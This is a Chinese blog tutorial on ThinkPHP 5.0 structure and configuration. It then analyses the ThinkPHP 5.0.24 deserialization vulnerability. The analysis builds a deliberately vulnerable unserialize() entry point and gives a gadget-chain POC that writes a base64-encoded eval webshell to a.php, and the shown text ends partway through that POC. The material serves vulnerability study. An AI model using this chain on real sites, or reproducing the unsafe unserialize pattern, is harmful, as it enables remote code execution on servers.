<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h4><p><strong>函数和类、属性命名</strong></p>
<ul>
<li>类的命名采用驼峰法（首字母大写），例如 <code>User</code>、<code>UserType</code>，默认不需要添加后缀，例如<code>UserController</code>应该直接命名为<code>User</code>；</li>
<li>函数的命名使用小写字母和下划线（小写字母开头）的方式，例如 <code>get_client_ip</code>；</li>
<li>方法的命名使用驼峰法（首字母小写），例如 <code>getUserName</code>；</li>
<li>属性的命名使用驼峰法（首字母小写），例如 <code>tableName</code>、<code>instance</code>；</li>
<li>以双下划线“__”打头的函数或方法作为魔术方法，例如 <code>__call</code> 和 <code>__autoload</code>；</li>
</ul>
<p><strong>常量和配置</strong></p>
<ul>
<li>常量以大写字母和下划线命名，例如 <code>APP_PATH</code>和 <code>THINK_PATH</code>；</li>
<li>配置参数以小写字母和下划线命名，例如 <code>url_route_on</code> 和<code>url_convert</code>；</li>
</ul>
<h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p>可以在README.md查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www  WEB部署目录（或者子目录）</span><br><span class="line">├─application           应用目录</span><br><span class="line">│  ├─common             公共模块目录（可以更改）</span><br><span class="line">│  ├─module_name        模块目录</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录</span><br><span class="line">│  │  ├─view            视图目录</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─command.php        命令行工具配置文件</span><br><span class="line">│  ├─common.php         公共函数文件</span><br><span class="line">│  ├─config.php         公共配置文件</span><br><span class="line">│  ├─route.php          路由配置文件</span><br><span class="line">│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">│  └─database.php       数据库配置文件</span><br><span class="line">│</span><br><span class="line">├─public                WEB目录（对外访问目录）</span><br><span class="line">│  ├─index.php          入口文件</span><br><span class="line">│  ├─router.php         快速测试文件</span><br><span class="line">│  └─.htaccess          用于apache的重写</span><br><span class="line">│</span><br><span class="line">├─thinkphp              框架系统目录</span><br><span class="line">│  ├─lang               语言文件目录</span><br><span class="line">│  ├─library            框架类库目录</span><br><span class="line">│  │  ├─think           Think类库包目录</span><br><span class="line">│  │  └─traits          系统Trait目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─tpl                系统模板目录</span><br><span class="line">│  ├─base.php           基础定义文件</span><br><span class="line">│  ├─console.php        控制台入口文件</span><br><span class="line">│  ├─convention.php     框架惯例配置文件</span><br><span class="line">│  ├─helper.php         助手函数文件</span><br><span class="line">│  ├─phpunit.xml        phpunit配置文件</span><br><span class="line">│  └─start.php          框架入口文件</span><br><span class="line">│</span><br><span class="line">├─extend                扩展类库目录</span><br><span class="line">├─runtime               应用的运行时目录（可写，可定制）</span><br><span class="line">├─vendor                第三方类库目录（Composer依赖库）</span><br><span class="line">├─build.php             自动生成定义文件（参考）</span><br><span class="line">├─composer.json         composer 定义文件</span><br><span class="line">├─LICENSE.txt           授权说明文件</span><br><span class="line">├─README.md             README 文件</span><br><span class="line">├─think                 命令行入口文件</span><br></pre></td></tr></table></figure>

<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p><code>ThinkPHP5.0</code>应用基于<code>MVC</code>（模型-视图-控制器）的方式来组织，我们首先要了解一下几个概念</p>
<p><strong>入口文件</strong></p>
<p>用户请求的PHP文件，负责处理一个请求（注意，不一定是URL请求）的生命周期，最常见的入口文件就是<code>index.php</code>，有时候也会为了某些特殊的需求而增加新的入口文件，例如给后台模块单独设置的一个入口文件<code>admin.php</code>或者一个控制器程序入口<code>think</code>都属于入口文件。</p>
<p><strong>应用</strong></p>
<p>应用在<code>ThinkPHP</code>中是一个管理系统架构及生命周期的对象，由系统的 <code>\think\App</code>类完成，应用通常在入口文件中被调用和执行，具有相同的应用目录（<code>APP_PATH</code>）的应用我们认为是同一个应用，但一个应用可能存在多个入口文件。</p>
<p>应用具有自己独立的配置文件、公共（函数）文件。</p>
<p><strong>模块</strong></p>
<p>一个典型的应用是由多个模块组成的，这些模块通常都是应用目录下面的一个子目录，每个模块都有自己独立的配置文件、公共文件和类库文件。</p>
<p>5.0支持单一模块架构设计，如果你的应用下面只有一个模块，那么这个模块的子目录是可以省略，并且在应用配置文件中修改<code>&#39;app_multi_module&#39; =&gt;	false</code></p>
<p><strong>控制器</strong></p>
<p>每个模块拥有独立的<code>MVC</code>类库及配置文件，一个模块下面有多个控制器负责响应请求，而每个控制器其实就是一个独立的控制器类。控制器主要负责请求的接收，并调用相关的模型处理，并最终通过视图输出。</p>
<p>5.0的控制器类比较灵活，可以无需继承任何基础类库。一个典型的<code>Index</code>控制器类如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,thinkphp!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>操作</strong></p>
<p>一个控制器包含多个操作（方法），操作方法是一个URL访问的最小单元。</p>
<p>下面是一个典型的<code>Index</code>控制器的操作方法定义，包含了两个操作方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hello,&#x27;</span>.<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>操作方法可以不使用任何参数，如果定义了一个非可选参数，则该参数必须通过用户请求传入，如果是URL请求，则通常是<code>$_GET</code>或者<code>$_POST</code>方式传入。</p>
<h4 id="URL访问"><a href="#URL访问" class="headerlink" title="URL访问"></a>URL访问</h4><p><strong>URL设计</strong></p>
<p>ThinkPHP<code>5.0</code>在没有启用路由的情况下典型的URL访问规则是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://thinkphp5/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure>

<p>采用的是<code>PATH_INFO</code>访问地址，其中<code>PATH_INFO</code>的分隔符是可以设置的。</p>
<p>如果不支持<code>PATH_INFO</code>的服务器可以使用兼容模式访问如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure>

<p>必要的时候，我们可以通过某种方式，省略URL里面的模块和控制器。</p>
<p><strong>URL大小写</strong></p>
<p>默认情况下，<code>URL</code>是不区分大小写的，也就是说 <code>URL</code>里面的<strong>模块&#x2F;控制器&#x2F;操作名</strong>会自动转换为小写，控制器在最后调用的时候会转换为驼峰法处理。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/index.php/Index/Blog/read</span><br><span class="line">// 和下面的访问是等效的</span><br><span class="line">http://localhost/index.php/index/blog/read</span><br></pre></td></tr></table></figure>

<p>如果访问下面的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/index.php/Index/BlogTest/read</span><br><span class="line">// 和下面的访问是等效的</span><br><span class="line">http://localhost/index.php/index/blogtest/read</span><br></pre></td></tr></table></figure>

<p>在这种URL不区分大小写情况下，如果要访问驼峰法的控制器类（即控制器blog的test类），则需要使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/index.php/Index/blog_test/read</span><br></pre></td></tr></table></figure>

<p>注：模块名和操作名会直接转换为小写处理。</p>
<h4 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h4><p><strong>目录结构</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├─application           应用目录（可设置）</span><br><span class="line">│  ├─common             公共模块目录（可选）</span><br><span class="line">│  ├─common.php         公共函数文件</span><br><span class="line">│  ├─route.php          路由配置文件</span><br><span class="line">│  ├─database.php       数据库配置文件</span><br><span class="line">│  ├─config.php         应用配置文件</span><br><span class="line">│  ├─module1            模块1目录</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录（可选）</span><br><span class="line">│  │  ├─view            视图目录（可选）</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  │ </span><br><span class="line">│  ├─module2            模块2目录</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录（可选）</span><br><span class="line">│  │  ├─view            视图目录（可选）</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br></pre></td></tr></table></figure>

<p>遵循ThinkPHP<code>5.0</code>的命名规范，模块目录全部采用<strong>小写和下划线</strong>命名。</p>
<p>其中<code>common</code>模块是一个特殊的模块，默认是禁止直接访问的，一般用于放置一些公共的类库用于其他模块的继承。</p>
<p><strong>模块类库</strong></p>
<p>一个模块下面的类库文件的命名空间统一以<code>app\模块名</code>开头，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// index模块的Index控制器类</span><br><span class="line">app\index\controller\Index</span><br><span class="line">// index模块的User模型类</span><br><span class="line">app\index\model\User</span><br></pre></td></tr></table></figure>

<p>其中<code>app</code>可以通过定义的方式更改，例如我们在应用配置文件中修改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;app_namespace&#x27; =&gt; &#x27;application&#x27;,</span><br></pre></td></tr></table></figure>

<p>那么，index模块的类库命名空间则变成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// index模块的Index控制器类</span><br><span class="line">application\index\controller\Index</span><br><span class="line">// index模块的User模型类</span><br><span class="line">application\index\model\User</span><br></pre></td></tr></table></figure>

<p>命名空间相关内容可以参考前文的前置知识</p>
<p><strong>单一模块</strong></p>
<p>如果你的应用比较简单，只有唯一一个模块，那么可以进一步简化成使用单一模块结构，方法如下：</p>
<p>首先在应用配置文件中定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 关闭多模块设计</span><br><span class="line">&#x27;app_multi_module&#x27;  =&gt;  false,</span><br></pre></td></tr></table></figure>

<p>然后，调整应用目录的结构为如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├─application        应用目录（可设置）</span><br><span class="line">│  ├─controller      控制器目录</span><br><span class="line">│  ├─model           模型目录</span><br><span class="line">│  ├─view            视图目录</span><br><span class="line">│  ├─ ...            更多类库目录</span><br><span class="line">│  ├─common.php      函数文件</span><br><span class="line">│  ├─route.php       路由配置文件</span><br><span class="line">│  ├─database.php    数据库配置文件</span><br><span class="line">│  └─config.php      配置文件</span><br></pre></td></tr></table></figure>

<p>URL访问地址变成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://serverName/index.php（或者其它应用入口）/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure>

<p>同时，单一模块设计下的应用类库的命名空间也有所调整，例如：</p>
<p>原来的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app\index\controller\Index</span><br><span class="line">app\index\model\User</span><br></pre></td></tr></table></figure>

<p>变成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app\controller\Index</span><br><span class="line">app\model\User</span><br></pre></td></tr></table></figure>

<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="配置格式"><a href="#配置格式" class="headerlink" title="配置格式"></a>配置格式</h4><p>ThinkPHP框架中默认所有配置文件的定义格式均采用返回<strong>PHP数组</strong>的方式</p>
<p>格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//项目配置文件</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;DEFAULT_MODULE&#x27;</span>     =&gt; <span class="string">&#x27;Index&#x27;</span>, <span class="comment">//默认模块</span></span><br><span class="line">    <span class="string">&#x27;URL_MODEL&#x27;</span>          =&gt; <span class="string">&#x27;2&#x27;</span>, <span class="comment">//URL模式</span></span><br><span class="line">    <span class="string">&#x27;SESSION_AUTO_START&#x27;</span> =&gt; <span class="literal">true</span>, <span class="comment">//是否开启session</span></span><br><span class="line">    <span class="comment">//更多配置参数</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>注：二级参数配置区分大小写</p>
<h4 id="配置加载"><a href="#配置加载" class="headerlink" title="配置加载"></a>配置加载</h4><p>在ThinkPHP中，一般来说应用的配置文件是自动加载的，加载的顺序是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">惯例配置-&gt;应用配置-&gt;模式配置-&gt;调试配置-&gt;状态配置-&gt;模块配置-&gt;扩展配置-&gt;动态配置</span><br></pre></td></tr></table></figure>

<p>以上是配置文件的加载顺序，因为后面的配置会覆盖之前的同名配置（在没有生效的前提下），所以配置的优先顺序从右到左。</p>
<p>主要的配置：</p>
<ul>
<li><p>惯例配置：ThinkPHP&#x2F;Conf&#x2F;convention.php</p>
<p>按照大多数的使用对常用参数进行了默认配置</p>
</li>
<li><p>应用配置：Application&#x2F;Common&#x2F;Conf&#x2F;config.php</p>
<p>调用所有模块之前都会首先加载的公共配置文件</p>
</li>
<li><p>模块配置：Application&#x2F;当前模块名&#x2F;Conf&#x2F;config.php</p>
<p>每个模块会自动加载自己的配置文件</p>
</li>
<li><p>动态配置：在具体的操作方法里面，对某些参数进行动态配置</p>
<p><code>C(&#39;参数名称&#39;,&#39;新的参数值&#39;)</code></p>
</li>
</ul>
<h4 id="读取配置"><a href="#读取配置" class="headerlink" title="读取配置"></a>读取配置</h4><p>无论何种配置文件，定义了配置文件之后，都会统一使用系统提供的C方法（config）来读取已有的配置，这个方法可以在任何地方读取任何配置</p>
<p>用法：<code>C(&#39;参数名称&#39;)</code></p>
<p>例如，读取当前的URL模式配置参数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$model</span> = <span class="title function_ invoke__">C</span>(<span class="string">&#x27;URL_MODEL&#x27;</span>);</span><br><span class="line"><span class="comment">// 由于配置参数不区分大小写，因此下面的写法是等效的</span></span><br><span class="line"><span class="comment">// $model = C(&#x27;url_model&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>注：配置参数名称中不能含有 “.” 和特殊字符，允许字母、数字和下划线</p>
<h4 id="扩展配置"><a href="#扩展配置" class="headerlink" title="扩展配置"></a>扩展配置</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加载扩展配置文件</span></span><br><span class="line"><span class="string">&#x27;LOAD_EXT_CONFIG&#x27;</span> =&gt; <span class="string">&#x27;user,db&#x27;</span>, </span><br></pre></td></tr></table></figure>

<p>假设<code>user.php</code> 和<code>db.php</code>分别用于用户配置和数据库配置</p>
<p>其中公共配置的加载在<code>Application/Common/Conf/user.php</code>和<code>Application/Common/Conf/db.php</code></p>
<h3 id="框架引导start-php"><a href="#框架引导start-php" class="headerlink" title="框架引导start.php"></a>框架引导start.php</h3><p>thinkphp为单程序入口，这是 mvc 框架的特征，程序的入口在public目录下的index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义应用目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_PATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../application/&#x27;</span>);</span><br><span class="line"><span class="comment">// 加载框架引导文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../thinkphp/start.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><code>require</code>引入 thinkphp 的<code>start.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ThinkPHP 引导文件</span></span><br><span class="line"><span class="comment">// 1. 加载基础文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/base.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 执行应用</span></span><br><span class="line"><span class="title class_">App</span>::<span class="title function_ invoke__">run</span>()-&gt;<span class="title function_ invoke__">send</span>();</span><br></pre></td></tr></table></figure>

<p>跟进到base.php，在<code>base.php(thinkphp/base.php)</code>中定义了一些常量，比如<code>ROOT_PATH</code>、<code>RUNTIME_PATH</code>、<code>LOG_PATH</code>等等，然后引入<code>Loader</code>类来自动加载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">位于thinkphp/base.php:38</span><br><span class="line">require CORE_PATH . &#x27;Loader.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>然后在下面通过<code>.env</code>文件 putenv 环境变量，接下来都是加载一些配置文件</p>
<p>最后配置完返回 <code>thinkphp/start.php</code> 启动程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//执行应用</span><br><span class="line">App::run()-&gt;send();</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="ThinkPHP5-0-x反序列化链"><a href="#ThinkPHP5-0-x反序列化链" class="headerlink" title="ThinkPHP5.0.x反序列化链"></a>ThinkPHP5.0.x反序列化链</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><code>thinkphp5.0.24</code>源码下载链接：<a href="http://m.lxywzjs.com/wap/article/index/artid/200.html">http://m.lxywzjs.com/wap/article/index/artid/200.html</a></p>
<p>这里选择的是phpstudy上搭建，版本为<code>PHP7.34+Xdebug+thinkphp5.0.24</code></p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240618224916921.png"></p>
<p>创建好网站后，我们要准备一个二次反序列化入口</p>
<p>修改<code>application\index\controller\Index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;       </span><br><span class="line">        <span class="variable">$payload</span>=<span class="variable">$_POST</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$payload</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就是修改compose.json为5.0.24以及php版本</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708195557785.png"></p>
<p>修改好上述内容后把下载好的文件夹内所有内容放到刚刚搭建网站的根目录</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240707123532191.png"></p>
<p>启动web服务访问<code>/public</code>，若出现以下界面说明搭建成功</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240707123819033.png"></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//__destruct</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Windows</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span>=[];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pivot</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[]=<span class="variable">$pivot</span>; <span class="comment">//传入Pivot类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//__toString Model子类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Pivot</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>,<span class="variable">$hasone</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>=<span class="variable">$output</span>; <span class="comment">//$this-&gt;parent等于Output类</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error=<span class="variable">$hasone</span>;   <span class="comment">//$modelRelation=$this-&gt;error</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getModel</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model=<span class="variable">$output</span>; <span class="comment">//get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">handle</span> = <span class="title class_">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$memcache</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle=<span class="variable">$memcache</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles=[<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Relation</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">query</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query=<span class="variable">$query</span>; <span class="comment">//调用Query类的getModel</span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation=<span class="literal">false</span>; <span class="comment">//满足条件!$modelRelation-&gt;isSelfRelation()</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;admin&#x27;</span>];  <span class="comment">//控制__call的参数$attr</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcache</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span> = <span class="title class_">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler=<span class="variable">$file</span>; <span class="comment">//$this-&gt;handler等于File类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span> = [</span><br><span class="line">            &#x27;<span class="title class_">path</span>&#x27;=&gt; &#x27;<span class="title class_">php</span>://<span class="title class_">filter</span>/<span class="title class_">convert</span>.<span class="title class_">iconv</span>.<span class="title class_">utf</span>-8.<span class="title class_">utf</span>-7|<span class="title class_">convert</span>.<span class="title class_">base64</span>-<span class="title class_">decode</span>/<span class="title class_">resource</span>=<span class="title class_">aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g</span>/../<span class="title class_">a</span>.<span class="title class_">php</span>&#x27;,</span><br><span class="line">            &#x27;<span class="title class_">cache_subdir</span>&#x27;=&gt;<span class="title class_">false</span>,</span><br><span class="line">            &#x27;<span class="title class_">prefix</span>&#x27;=&gt;&#x27;&#x27;,</span><br><span class="line">            &#x27;<span class="title class_">data_compress</span>&#x27;=&gt;<span class="title class_">false</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">file</span>=<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>();</span><br><span class="line">    <span class="variable">$memcache</span>=<span class="keyword">new</span> think\session\driver\<span class="title function_ invoke__">Memcache</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$output</span>=<span class="keyword">new</span> think\console\<span class="title function_ invoke__">Output</span>(<span class="variable">$memcache</span>);</span><br><span class="line">    <span class="variable">$query</span>=<span class="keyword">new</span> think\db\<span class="title function_ invoke__">Query</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="variable">$hasone</span>=<span class="keyword">new</span> think\model\relation\<span class="title function_ invoke__">HasOne</span>(<span 